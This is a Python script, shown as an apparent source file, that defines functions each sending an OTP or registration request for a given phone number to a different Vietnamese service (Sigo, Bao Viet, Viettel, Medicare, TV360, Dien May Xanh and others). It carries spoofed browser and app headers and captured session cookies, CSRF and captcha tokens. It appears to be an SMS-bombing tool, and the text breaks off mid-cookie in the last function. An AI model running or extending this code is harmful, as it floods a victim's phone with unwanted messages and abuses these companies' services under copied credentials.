def sigo(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json",
        "origin": "https://sigo.vn",
        "priority": "u=1, i",
        "referer": "https://sigo.vn/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-check": "bheieicchbdeg",
    }
    json_data = {
        "UI_StartAt": 1748482271346,
        "UI_FirstID": "mgfn_1748482222443",
        "AppName": "sigoweb",
        "Url": "https://sigo.vn/",
        "DocumentWidth": 1280,
        "MobilePhone": phone,
        "ActionType": "register",
        "UI_TimezoneOffset": -420,
    }
    response = requests.post(
        "https://api.sigo.vn/api/v1/Account/GetOTP", headers=headers, json=json_data
    )
def baoviet(phone):
    cookies = {
        "baoviet4u_cookie": "f5ace1b697f7cb31bb209e1cc11258b7",
    }
    headers = {
        "Host": "bvdr.baoviet.com.vn",
        # 'Cookie': 'baoviet4u_cookie=f5ace1b697f7cb31bb209e1cc11258b7',
        "secret": "042318",
        "accept": "application/json",
        "user-agent": "Baoviet Direct/6.9.17 (com.baoviet.bvgi.baoviet4u; build:3; iOS 17.4.1) Alamofire/4.9.1",
        "accept-language": "vi;q=1.0",
    }
    params = {
        "userName": phone,
        "type": "1",
    }
    response = requests.get(
        "https://bvdr.baoviet.com.vn/api/unauth/sendOTP_v3",
        params=params,
        cookies=cookies,
        headers=headers,
    )
def truedoc(phone):
    headers = {
        "Host": "mapi.aihealth.vn",
        "accept": "application/json",
        "content-type": "application/json; charset=utf-8",
        "x-auth-id": "9B1B13952BD9FF446AB569BBB49B3",
        "authorization": "Bearer ",
        "postman-token": "f3dc96f9-6287-46cb-9b93-7d69dfeca783,298d8d62-ed78-4b27-b614-182d047e15fa",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "AI_HEALTH/14 CFNetwork/1494.0.7 Darwin/23.4.0",
        "accept-language": "vi-VN",
    }
    params = {
        "Phone": phone,
        "CountryCode": "84",
        "DeviceId": "5308E878-5785-4579-B17D-736E1E008E47",
        "UuidByKeychain": "5308E878-5785-4579-B17D-736E1E008E47",
        "GrantType": "register_key",
    }
    response = requests.get(
        "https://mapi.aihealth.vn/api/mobile/v1/sso/register/key",
        params=params,
        headers=headers,
    )
def babilala(phone):
    headers = {
        "Host": "api.babilala.vn",
        "phone": phone,
        "accept": "*/*",
        "lang": "vi",
        "content-type": "application/x-www-form-urlencoded",
        "x-unity-version": "2019.3.15f1",
        "user-agent": "babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    response = requests.post("https://api.babilala.vn/api/getOtp", headers=headers)
def vieclam24h(phone):
    headers = {
        "Host": "api.mobile.vieclam24h.vn",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjaGFubmVsX2NvZGUiOiJ2bDI0aCIsInVzZXIiOm51bGx9.a0POm2ZVRwetYs2QsMj0sRg8lZSSbKufX4sewqhAM5o",
        "app-version": "1.10.0",
        "app-name": "VIECLAM24H-MOBILE-APP",
        "os": "IOS",
        "accept-language": "vi-VN,vi;q=0.9",
        "x-api-version": "1.0",
        "user-agent": "Vieclam24h/1 CFNetwork/1494.0.7 Darwin/23.4.0",
        "lang": "vi",
        "os-version": "17.4.1",
    }
    json_data = {
        "type": 1,
        "mobile": phone,
    }
    response = requests.post(
        "https://api.mobile.vieclam24h.vn/seeker/request-otp",
        headers=headers,
        json=json_data,
    )
def sapo(phone):
    cookies = {
        "landing_page": "https://www.sapo.vn/dang-nhap-kenh-ban-hang.html",
        "start_time": "04/30/2025 0:3:46",
        "pageview": "1",
        "_fbp": "fb.1.1745996626850.500010900568680424",
        "cebs": "1",
        "_ce.clock_data": "162%2C171.236.58.142%2C1%2C33d0f257a817d1ca4c4381b87f8ad83f%2CChrome%2CVN",
        "cebsp_": "1",
        "_ga": "GA1.1.1902361527.1745996628",
        "source": "https://www.sapo.vn/dang-nhap-kenh-ban-hang.html",
        "_gcl_au": "1.1.396795918.1745996627.542448179.1745996656.1745996655",
        "_ga_P9DPF3E00F": "GS1.1.1745996627.1.1.1745996662.25.0.1015646794",
        "_ce.s": "v~c8242fd185009cf0ae76909196f286bb34849746~lcw~1745996662791~vir~new~lva~1745996627121~vpv~0~v11.cs~200798~v11.s~4318a6a0-2591-11f0-9207-05ed9a5a9231~v11.sla~1745996662801~lcw~1745996662801",
        "lang": "vi",
        "SESSION": "ODg3YzM1ZDAtNjg0Ni00NjZiLTliNTUtZTFmYTUwMzYxMzNi",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://accounts.sapo.vn",
        "priority": "u=1, i",
        "referer": "https://accounts.sapo.vn/register/confirm?t=DTqKLjXPYqjEcI977s6IwbS6pmwXC6hgAATn&lang=vi",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        # 'cookie': 'landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=04/30/2025 0:3:46; pageview=1; _fbp=fb.1.1745996626850.500010900568680424; cebs=1; _ce.clock_data=162%2C171.236.58.142%2C1%2C33d0f257a817d1ca4c4381b87f8ad83f%2CChrome%2CVN; cebsp_=1; _ga=GA1.1.1902361527.1745996628; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; _gcl_au=1.1.396795918.1745996627.542448179.1745996656.1745996655; _ga_P9DPF3E00F=GS1.1.1745996627.1.1.1745996662.25.0.1015646794; _ce.s=v~c8242fd185009cf0ae76909196f286bb34849746~lcw~1745996662791~vir~new~lva~1745996627121~vpv~0~v11.cs~200798~v11.s~4318a6a0-2591-11f0-9207-05ed9a5a9231~v11.sla~1745996662801~lcw~1745996662801; lang=vi; SESSION=ODg3YzM1ZDAtNjg0Ni00NjZiLTliNTUtZTFmYTUwMzYxMzNi',
    }
    json_data = {
        "country_code": "84",
        "phone_number": phone,
        "type": "REQUEST_REGISTER",
        "register_token": "DTqKLjXPYqjEcI977s6IwbS6pmwXC6hgAATn",
    }
    response = requests.post(
        "https://accounts.sapo.vn/otp/get_last",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def myviettel(phone):
    cookies = {
        "D1N": "10717d56dc39b28aacde4e4eaaaa944e",
        "laravel_session": "qGiVEYAgmLS2aGsbnB5lg8dkOIWFSt1G27mHcwRz",
        "_fbp": "fb.1.1745996830753.779149789119675498",
        "_gcl_au": "1.1.289373337.1745996831",
        "_ga": "GA1.2.2021564931.1745996831",
        "_gid": "GA1.2.1803255515.1745996831",
        "_gat_UA-58224545-1": "1",
        "redirectLogin": "https://viettel.vn/myviettel",
        "__zi": "3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eaeWV-XZ5LDYok2_gR3L4oEOuBnfSLGHumnEG.1",
        "_ga_Z30HDXVFSV": "GS1.1.1745996831.1.1.1745996840.0.0.0",
        "XSRF-TOKEN": "eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0%3D",
        "_ga_VH8261689Q": "GS1.1.1745996831.1.1.1745996843.48.0.0",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://viettel.vn",
        "priority": "u=1, i",
        "referer": "https://viettel.vn/myviettel",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-csrf-token": "YmWjtYDADMWpv5nYaFUt0L6EWorIdwuOpOM5q4Gz",
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": "eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0=",
        # 'cookie': 'D1N=10717d56dc39b28aacde4e4eaaaa944e; laravel_session=qGiVEYAgmLS2aGsbnB5lg8dkOIWFSt1G27mHcwRz; _fbp=fb.1.1745996830753.779149789119675498; _gcl_au=1.1.289373337.1745996831; _ga=GA1.2.2021564931.1745996831; _gid=GA1.2.1803255515.1745996831; _gat_UA-58224545-1=1; redirectLogin=https://viettel.vn/myviettel; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eaeWV-XZ5LDYok2_gR3L4oEOuBnfSLGHumnEG.1; _ga_Z30HDXVFSV=GS1.1.1745996831.1.1.1745996840.0.0.0; XSRF-TOKEN=eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0%3D; _ga_VH8261689Q=GS1.1.1745996831.1.1.1745996843.48.0.0',
    }
    json_data = {
        "phone": phone,
        "typeCode": "DI_DONG",
        "actionCode": "myviettel://login_mobile",
        "type": "otp_login",
    }
    response = requests.post(
        "https://viettel.vn/api/getOTPLoginCommon",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def medicare(phone):
    cookies = {
        "XSRF-TOKEN": "eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0%3D",
        "medicare_session": "eyJpdiI6IjNLRUtseUdxV3NphoneV5WDhLcDlpV1E9PSIsInZhbHVlIjoiMzdsNG1lZGtjcWJTUE1TUkhDVmJpYWc1ZU9IeW1LU0tMTUJXMnpZNFRYOU5SQ2RvTUJPSjBGY2g0UldmeS9JQjJlQnZRV3NoSk56S2srTG5mMEFrVTRCUnE5MFU2andxMkozc0dSZGJ6eHFQVGdwbFdpaTBNYk40UXlsNkZVOHQiLCJtYWMiOiJmODY5N2UyZTY4NDc0YmJlYTczMGJkNzU0MDNkZmQ3Y2NlMjgzNTdmOTEzZTY0NDE1OGU0Yzc3N2ZkYWE4YmMwIiwidGFnIjoiIn0%3D",
        "SERVER": "nginx2",
        "_ga_SSLZMTVB8K": "GS1.1.1745996950.1.0.1745996950.0.0.0",
        "_ga": "GA1.1.1761273133.1745996951",
        "_fbp": "fb.1.1745996951365.718462269982349305",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://medicare.vn",
        "Referer": "https://medicare.vn/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-XSRF-TOKEN": "eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0=",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        # 'Cookie': 'XSRF-TOKEN=eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjNLRUtseUdxV3NphoneV5WDhLcDlpV1E9PSIsInZhbHVlIjoiMzdsNG1lZGtjcWJTUE1TUkhDVmJpYWc1ZU9IeW1LU0tMTUJXMnpZNFRYOU5SQ2RvTUJPSjBGY2g0UldmeS9JQjJlQnZRV3NoSk56S2srTG5mMEFrVTRCUnE5MFU2andxMkozc0dSZGJ6eHFQVGdwbFdpaTBNYk40UXlsNkZVOHQiLCJtYWMiOiJmODY5N2UyZTY4NDc0YmJlYTczMGJkNzU0MDNkZmQ3Y2NlMjgzNTdmOTEzZTY0NDE1OGU0Yzc3N2ZkYWE4YmMwIiwidGFnIjoiIn0%3D; SERVER=nginx2; _ga_SSLZMTVB8K=GS1.1.1745996950.1.0.1745996950.0.0.0; _ga=GA1.1.1761273133.1745996951; _fbp=fb.1.1745996951365.718462269982349305',
    }
    json_data = {
        "mobile": phone,
        "mobile_country_prefix": "84",
        "token": "03AFcWeA7higReiwd6FLyxu9scEOOYIq57D2Zx_5S_uvL-D6nKgMPJWdzQt_s4vgWa0goiXVypMFX20xHMV6WLwS6W6rqVE_dEdOHD6YFoZIi0-hERSLHNRNIx5k2Zvug1Ln-PY16reAMa6gDQixct3xeF4CW3A1saLsGUlT13YHLm5sI2zVj5wvykGTY5rAHAxyxHNHt_6FP_KbeEvQuTqnQRfv2tSbwMOsxhcpPK5HWSNSFEVLDrvvR00WUYgVVouMZpHR099IyC9DSanlmxNAYY-FTTi51s_kg-E4uBQ5ud6OtscYLyw2mcFl-1vvaBcLgA-vxW6VRavHt1ZnH8-p9ycXESJZZfqg3Z61ZSqwJYDUqug8JhAj6EjuoUornMYdi2CEhZSGAUiZUyk6hYuzDgL8GBWqLYm2Jbe0qntLq07Not1dlY4hgfUBKhAk7eYoCghFwKzCgkAo93NB13HFYTHBsuvZq5PgtqL6onq1BljPnH0NGJ-Epwh6NI-w0_hsgZ9SqYqcYQZZdqOI19EeNzlWh7CL7FoP0x8CTWyMrMPVtr8I5gHzRJrkLiQ2TckI_0EPlixh8_LXVzTs89hu_wRT0qX3gCTcqn7hK8m5RGFAoiR47D-itJ1JCXdSSxMmYzCUoFqs0Zhbx7eOjHEeR10DVmVqiNivw8Oyb_bAgZQ1Um6qd7UaVL9EL8MlOwV0MYzja9xNPkEgJgeMhgX5BHAMvuhTDbcSDlRpWGdZ_ythYhjRWu-Cy620bu_NEi3znOYf6uXvd8a9GXBh_f8sK0K2RBLwODAcAvkaXrRbqGziEYmtqRqVp67li-EMbO2FVLD-CaHIqSBGoJaFkgQzMTzs2UAimWJTKnhIIoYHmh7xngGWrakS786jqptVhnyYDw1zt1TNNM3zUuyPC1VG2x789HEulxOvVJjG9L7CSzbU0lL-cAYlKzMOxnUZ3mfCBw9uZdCgZthi55dctjJNiuaBXFFUSo8pwzEOEYs8VYerTVXmzK0sAryMAXP_fOcBmoEzjXhow9mZUKTNtq16ANNCnGjWaKyVCn_jEqqzZtgvajAwTWIwkcYkshzu6khPYXoXk1ErUC4eEe_RmSqMURDksbWBwphh6rkOv5GbTyMuSNAEqnkyMEefisckXTfgThF8PZXzehoNCGQfkbezp4jCPp74kjh_ukNNPCG8CLIfe9hGWvce5x1yS1tQlLHvdn7vtipiCNA-YJDxAoemWr6cXdNayUOVjCtnOZ8BG9TSGDjVP1gMqlSIVNbWk3YbV4v0A4qtnuR_cwkouwy7kCpdcKYTdRh9TXvU_ByEJ6eDMws_SR506X7aaPN7hAG5yhkLseWFaL9TnJm-Hyuq8m1m7se7uPTLAd5OmgBL2q9zThESE3rFUGL2wWkBkTxIekSXU70GOhMxQG4k0KQRnnvz5xBLxSAVXPEhJbjrAlbGws6GTSBnKIVu1ecQ2h2AeQhnxLjapBFDd2N8goNbyvlAPf3xGAhXKXUYycX9ZCQWt2PmdXgUL2INAKxJLIeJsDERG7Rq7SEIGuC5LOwfiaYB0OKl9EfcMwsrtojnSIHykIh0zGMD8-_EA8AINY7o82aGARCRvPQaoIHVf6byTIziNMtKCOoKkljhXIYZkVwf3-eLTXGoaUMi2fSSqY7liZCF09Xn-mFhwiLPiStQ_0U3yWg9M6ArHrjCXK48o9VqcKah8YkHQN7mGYJz5HaoV3pnc74oiSHPFLtVE3dnJKMfgxa_uYiYGNZFKs0jMkQ4J0Aj5xA59885zMaH6SN7S_dskcpOZfx-nAbSD2ByV8iHXE8WZLocUm41MrGfiMEoYSEG3-D0kC4rr9fxskzfnSfy1qzz1fu4CHBElL8yrWN1PAzpAv94uoIOJPpt5OFHvT7iuQnvrKbnboO0xS8s2vLDIci5EUDU2aB4PYYJfaOKGU_pQ3oTEmlkLmdD4aeHicXY6xXFv3Y4r8e7-g1InCXnjKACUVx1sOljxHnmxUBGTgFXwM-7JA_Nyh3n2ldN7m-HDTsfnOw64WB9Fk1RXW77pJR8xG4-Mt3UKy-ESJ_0DFzpFME6riYQPvGdyirjQwTIssRL9AJOHYmGiKPpdZrYiZIBkT",
        "client": "web",
    }
    response = requests.post(
        "https://medicare.vn/api/otp", cookies=cookies, headers=headers, json=json_data
    )
def tv360(phone):
    cookies = {
        "img-ext": "avif",
        "NEXT_LOCALE": "vi",
        "device-id": "s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o",
        "shared-device-id": "web_dd1bad97-e5d7-4e26-a742-c6112bac53a2",
        "embed-device-id": "s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o",
        "screen-size": "s%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo",
        "session-id": "s%3A600e3391-40b7-4139-98d2-cde3dee89d4b.rdii%2BxRHaJNsNurHP9oL7x0bFMjw6MitcUPEY0vxAkg",
        "_ga": "GA1.2.1353961798.1745997064",
        "_gid": "GA1.2.686180996.1745997064",
        "_gat_UA-180935206-1": "1",
        "G_ENABLED_IDPS": "google",
        "_ga_D7L53J0JMS": "GS1.1.1745997064.1.1.1745997070.54.0.0",
        "_ga_E5YP28Y8EF": "GS1.1.1745997064.1.1.1745997070.0.0.0",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://tv360.vn",
        "priority": "u=1, i",
        "referer": "https://tv360.vn/login",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "starttime": "1745997070874",
        "tz": "America/Los_Angeles",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o; shared-device-id=web_dd1bad97-e5d7-4e26-a742-c6112bac53a2; embed-device-id=s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o; screen-size=s%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo; session-id=s%3A600e3391-40b7-4139-98d2-cde3dee89d4b.rdii%2BxRHaJNsNurHP9oL7x0bFMjw6MitcUPEY0vxAkg; _ga=GA1.2.1353961798.1745997064; _gid=GA1.2.686180996.1745997064; _gat_UA-180935206-1=1; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS1.1.1745997064.1.1.1745997070.54.0.0; _ga_E5YP28Y8EF=GS1.1.1745997064.1.1.1745997070.0.0.0',
    }
    json_data = {
        "msisdn": phone,
    }
    response = requests.post(
        "https://tv360.vn/public/v1/auth/get-otp-login",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def dienmayxanh(phone):
    cookies = {
        "TBMCookie_3209819802479625248": "845972001745997151vIjEV+RSYSM8lVpicuLTdOO96us=",
        "___utmvm": "###########",
        "_oauthCDP_WebDMX_Production": "2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQczxQyHvYbPDt5PMcSUc_IHgFec9cvyjymCjcErmg94buomtPIrmg94W1MfrV0nqyvgmiYAJCVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94frmg94a_TW7LIfzqf2MA4NVkheLuQCaS3k6s_1ooKhkFqHr2nuExlxf1u2AcKUazMuIh75kkBpcioZOWDUHB80_ZOk-",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.SuBGfRYNAsQ": "CfDJ8DeM8It-JwlAhxpbhi7u5Q8mNjVWUUQmYHT4gGMPDQvE49zjEOlaYvukJ-uMOAQqII2f8hUivoUGg3F4MOflW-8y7gE1T0xbSzZObsD469dE2vXA4nMcQ8rmd3nhQcUuKddcaNN_Nj0nUN9-V9WpFZQ",
        "DMX_Personal": "%7B%22UID%22%3A%22e6d94a3534afc480fc6ea91ef010a096bb76d1e9%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        "___utmvc": "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        "_gcl_au": "1.1.1138012301.1745997153",
        "_ga": "GA1.1.1060106111.1745997153",
        "__uidac": "016811cd611fe7511ea21435c5ee2a96",
        "__admUTMtime": "1745997153",
        "_pk_id.2.8977": "5ebe289a070352aa.1745997153.",
        "_pk_ses.2.8977": "1",
        "__iid": "",
        "__iid": "",
        "__su": "0",
        "__su": "0",
        "_fbp": "fb.1.1745997154121.12996446599693872",
        "__RC": "25",
        "__R": "1",
        "__uif": "__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338",
        "chatmode": "0",
        "SvID": "new2690|aBHNZ|aBHNY",
        "_ga_Y7SWKJEHCE": "GS1.1.1745997153.1.1.1745997155.58.0.0",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.dienmayxanh.com",
        "Referer": "https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        # 'Cookie': "TBMCookie_3209819802479625248=845972001745997151vIjEV+RSYSM8lVpicuLTdOO96us=; ___utmvm=###########; _oauthCDP_WebDMX_Production=2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQczxQyHvYbPDt5PMcSUc_IHgFec9cvyjymCjcErmg94buomtPIrmg94W1MfrV0nqyvgmiYAJCVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94frmg94a_TW7LIfzqf2MA4NVkheLuQCaS3k6s_1ooKhkFqHr2nuExlxf1u2AcKUazMuIh75kkBpcioZOWDUHB80_ZOk-; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8DeM8It-JwlAhxpbhi7u5Q8mNjVWUUQmYHT4gGMPDQvE49zjEOlaYvukJ-uMOAQqII2f8hUivoUGg3F4MOflW-8y7gE1T0xbSzZObsD469dE2vXA4nMcQ8rmd3nhQcUuKddcaNN_Nj0nUN9-V9WpFZQ; 